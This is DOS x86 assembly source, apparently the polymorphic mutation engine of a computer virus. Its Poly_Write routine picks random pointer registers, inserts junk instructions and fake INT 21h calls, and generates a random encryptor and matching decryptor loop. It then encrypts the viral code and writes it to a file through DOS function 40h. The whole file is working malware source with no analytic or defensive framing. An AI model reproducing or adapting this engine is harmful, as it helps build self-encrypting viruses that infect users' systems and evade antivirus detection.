include .\sylvia_p\star.inc
include .\sylvia_p\short.inc
include .\sylvia_p\strucs.inc

include vdata.ash

extrn	Start_Crypt:NEAR
extrn	IO_21h:NEAR
extrn C	main:NEAR

;----------------------------------------------------------------------------
Reg16s		ENUM	{_AX,_CX,_DX,_BX,_SP,_BP,_SI,_DI}
Reg8s		ENUM	{_AL,_CL,_DL,_BL,_AH,_CH,_DH,_BH}
Indexes		ENUM	{iBX_SI,iBX_DI,iBP_SI,iBP_DI,iSI,iDI,iBP,iBX}

; R/M's
rm_00	equ	000h
rm_08	equ	040h
rm_16	equ	080h
rm_Reg	equ	0C0h

; 00h, 80h family
_ADD	=	00h
_OR	=	08h
_ADC	=	10h
_SBB	=	18h
_AND	=	20h
_SUB	=	28h
_XOR	=	30h
_CMP	=	38h

; C0h, D0h family
_ROL    =       00h
_ROR    =       08h
_RCL    =       10h
_RCR    =       18h
_SHL    =       20h
_SHR    =       28h
_SAL    =       30h
_SAR    =       38h

; FEh family
_INC	=	00h
_DEC	=	08h
_CALLN	=	10h
_CALLF	=	18h
_JMPN	=	20h
_JMPF	=	28h
_PUSH	=	30h

; F6h family
_TEST	=	00h
	       ;08h	
_NOT	=	10h
_NEG	=	18h
_MUL	=	20h
_IMUL	=	28h
_DIV	=	30h
_IDIV	=	38h

; 70h family
_JO     =       70h
_JNO    =       71h
_JC     =       72h
_JNC    =       73h
_JZ     =       74h
_JNZ    =       75h
_JAE    =       76h
_JA  	=       77h
_JS     =       78h
_JNS    =       79h
_JPZ    =       7Ah
_JPO    =       7Bh
_JL     =       7Ch
_JGE    =       7Dh
_JLE    =       7Eh
_JG     =       7Fh

ANY		equ	0

;----------------------------------------------------------------------------
			.model tiny, PASCAL
			.286
			
			jumps
			locals @@

;============================================================================
			.code
;----------------------------------------------------------------------------
			PUBLIC	Poly_Write
Poly_Write		PROC	NEAR
			local	loop_top:word, encryptor:byte:50

			push	bx
	@@Oh_For_Fuck_Sake:
			xor	si,si
			mov	di,crypt_buf
			mov	cx,code_size
			cld
			rep	movsb

			DO
			  call	Rand, ANY
			  and	al,101b
			  or	al,010b		; DX,BX,SI,DI
			  cmp	al,_DX
			CYCLE	E
			mov	ptr_reg,al
			add	al,iSI - _SI
			cmp	al,iSI - _SI + _BX
			DOIF	E
			 mov	al,iBX
			DONE
			mov	index_rm,al

			mov	di,ofs main+crypt_buf
			call	Junk
			call	Load_PTR
			call	Junk
			mov	loop_top,di
			call	Junk
			lea	ax,encryptor
			call	Make_Crypt, ax
			call	Junk
			call	Inc_PTR			
			STO_W	<(03 SHL 8) + _JNC>
			STO_B	0E9h
			stosw
			mov	ax,loop_top
			sub	ax,di
			dec	di
			dec	di
			stosw
			call	Junk

			mov	cx,ofs Start_Crypt+crypt_Buf
			sub	cx,di
			jbe	@@Oh_For_Fuck_Sake
			cmp	cx,3
			DOIF	BE
			  mov	al,90h
			  rep	stosb
			 DOELSE
			  sub	cx,3
			  mov	al,0E9h
			  stosb
			  mov	ax,cx
			  stosw
			  DO
			   call	Rand,ANY
			   stosb
			  CYCLE	LU
			DONE
			
			;mov	di,ofs Start_Crypt+crypt_buf
			DO
			  mov	bx,di
			  mov	si,di
			  lea	ax,encryptor
			  call	ax
			  inc	di
			  inc	di
			  cmp	di,end_crypt+crypt_buf
			CYCLE	B
			pop	bx

			mov	ah,40h
			mov	dx,crypt_buf + 100h
			mov	cx,code_size - 100h
			call	IO_21h
			ret

Poly_Write		ENDP

ptr_reg			db	?
index_rm		db	?

;----------------------------------------------------------------------------
Load_PTR		PROC	NEAR
			local	Op_Count:word, modifier:byte:50, other_di

			mov	al,0B8h
			or	al,ptr_reg
			stosb
			push	di
			stosw
			call	Rand, 6
			add	al,4
			mov	Op_Count,ax
			xchg	cx,ax
			DO
			  call	Get_Crypt_Op
			  push	dx			  
			  push	ax
			  mov	bx,wo ptr_reg
			  or	bl,rm_Reg
			  call	Build_Op, dx, ax, bx, 0
			CYCLE	LU
			mov	other_di,di
			lea	di,modifier
			mov	cx,Op_Count
			DO
			  call	Build_Op, rm_Reg + _AX, -1
			CYCLE	LU
			STO_B	0C3h
			lea	cx,modifier
			mov	di,other_di
			mov	ax,ofs Start_Crypt			
			call	cx
			pop	bx
			mov	wo [bx],ax
			ret

Load_PTR		ENDP

;----------------------------------------------------------------------------
Make_Crypt		PROC	NEAR
			arg	encrypt_ptr:word
			local	Op_Count:word

			call	Rand, 6
			add	al,4
			mov	Op_Count,ax
			xchg	cx,ax
			DO
			  call	Get_Crypt_Op
			  push	dx			  
			  push	ax
			  call	Build_Op, dx, ax, wo index_rm, 0
			CYCLE	LU
			xchg	di,encrypt_ptr
			mov	cx,Op_Count
			DO
			  call	Build_Op, wo index_rm, -1
			CYCLE	LU
			STO_B	0C3h
			mov	di,encrypt_ptr
			ret

Make_Crypt		ENDP

;----------------------------------------------------------------------------
Build_Op		PROC	NEAR uses cx
			arg	op_code:word, param:word, rm:word, invert:word

			mov	ax,op_code
			stosb
			mov	al,by rm
			push	di
			stosb
			mov	cx,3
			and	cl,ah
			mov	ax,param
			DOIF	NZ
			 stosb
			 xchg	ah,al
			CYCLE	LU
			mov	ax,op_code
			mov	al,00111000b
			test	invert,-1
			DOIF	NZ
			 shr	ah,3
			DONE
			shl	ah,1
			and	al,ah
			pop	bx
			or	[bx],al
			ret

Build_Op		ENDP

;----------------------------------------------------------------------------
Get_Crypt_Op		PROC	NEAR

			call	Junk
			call	Rand, No_Of_Crypt_Ops
			lea	si,Crypt_Ops
			add	si,ax
			add	si,ax
			lodsw
			xchg	dx,ax
			call	Rand, ANY
			ret

Get_Crypt_Op		ENDP

;----------------------------------------------------------------------------
Crypt_Op		MACRO	a,b,c,d

			 dw	a OR (b SHL 10) OR (c SHL 7) OR (d SHL 8)

			ENDM

Crypt_Ops		LABEL
			REPT	2
			 Crypt_Op	081h, _SUB, _ADD, 2
			 Crypt_Op	081h, _ADD, _SUB, 2
			 Crypt_Op	081h, _XOR, _XOR, 2
			ENDM
			Crypt_Op	0C1h, _ROL, _ROR, 1
			Crypt_Op	0C1h, _ROR, _ROL, 1
			Crypt_Op	0D1h, _ROL, _ROR, 0
			Crypt_Op	0D1h, _ROR, _ROL, 0
			Crypt_Op	0F7h, _NOT, _NOT, 0		
			Crypt_Op	0F7h, _NEG, _NEG, 0
			Crypt_Op	0FFh, _INC, _DEC, 0
			Crypt_Op	0FFh, _DEC, _INC, 0
No_Of_Crypt_Ops		=		($ - Crypt_Ops)/2

;----------------------------------------------------------------------------
Inc_PTR			PROC	NEAR

			mov	cx,2
			DO
			  call	Junk
			  call	Rand, ANY
			  DOIF	S
			    mov	al,40h
			    or	al,ptr_reg
			    stosb
			   DOELSE
			    pushf
			    STO_B	83h
			    mov		ax,(rm_Reg + _ADD) + (01h SHL 8)
			    popf
			    DOIF C
			     mov	ax,(rm_Reg + _SUB) + (-1h SHL 8)
			    DONE
			    or	al,ptr_reg
			    stosw
			  DONE
			CYCLE	LU
			call	Junk
			mov	ax,0F881h
			or	ah,ptr_reg
			stosw
			STO_W	end_crypt
			ret

Inc_PTR			ENDP

;----------------------------------------------------------------------------
Junk			PROC	NEAR uses cx
						
			call	Rand,3
			add	al,3
			xchg	cx,ax
			DO
			 call	Rand,ANY
			 DOIF	S
			  DOIF	O
			    call  Rand,11h
			    add	  al,70h
			    cmp	  al,80h
			    DOIF  E
			     mov  al,0EBh
			    DONE
			   DOELSE
			    call  Get_Junk_Reg
			    or	  al,0B8h
			    stosb 			    
			    call  Rand,ANY			    
			   DONE
			   stosw
			  DOELSE
			   DOIF O
			     STO_B	81h
			     call  	Get_Junk_Reg
			     mov	dl,rm_Reg
			     or		dl,al
			     call	Rand,ANY
			     and	al,00111000b
			     or		al,dl
			     stosb
			     call	Rand,ANY
			     stosw
			    DOELSE
			     call	Rand,No_Of_Ints
			     mov	bx,ofs Ints
			     xlatb			     
			     xchg	ah,al
			     mov	al,0B4h
			     stosw
			     mov	ax,21CDh
			     stosw 
			   DONE
			 DONE
			CYCLE	LU
			ret

Junk			ENDP

Ints			db	0Bh, 0Dh, 04Dh, 054h
No_Of_Ints		= 	($ - Ints)

;----------------------------------------------------------------------------
Get_Junk_Reg		PROC	NEAR

			DO
			 call   Rand,7
			 cmp	   al,_SP
			 REPEAT E
			 cmp	   al,ptr_reg
			CYCLE   E
			ret

Get_Junk_Reg		ENDP

;----------------------------------------------------------------------------
Rand			PROC	NEAR uses cx dx
			arg 	@@Max:word=PARM_SIZE

			mov	dx,wo [RNG_Seed.wHI]
			mov	ax,wo [RNG_Seed.wLO]
			mov	cx,19
			DO
			  or	dh,dh
			  DOIF	S
			   xor	al,1
			  DONE
			  test	al,01010111b
			  DOIF	PO
			   stc
			  DONE
			  rcr	dx,1
			  rcr	ax,1
			CYCLE	LU
			mov	wo [RNG_Seed.wHI],dx
			mov	wo [RNG_Seed.wLO],ax
			mov	cx,@@Max
			jcxz	@@No_Divide
			 xor	dx,dx
			 div	cx
			 xchg	dx,ax
		@@No_Divide:
			sahf
			ret

Rand			ENDP

RNG_Seed		dd	?

;----------------------------------------------------------------------------
PUBLIC			Init_Rand
Init_Rand		PROC	NEAR

			mvs	ds,40h
			mov	dx,wo ds:[046Ch.wLO]
			rol	dx,7
			xor	dx,wo ds:[046Ch.wHI]
			in	ax,40h
			rol	ax,3
			mvs	ds,cs
			add	wo [RNG_Seed.wHI],dx
			adc	wo [RNG_Seed.wLO],ax
			ret

Init_Rand		ENDP

;============================================================================
			END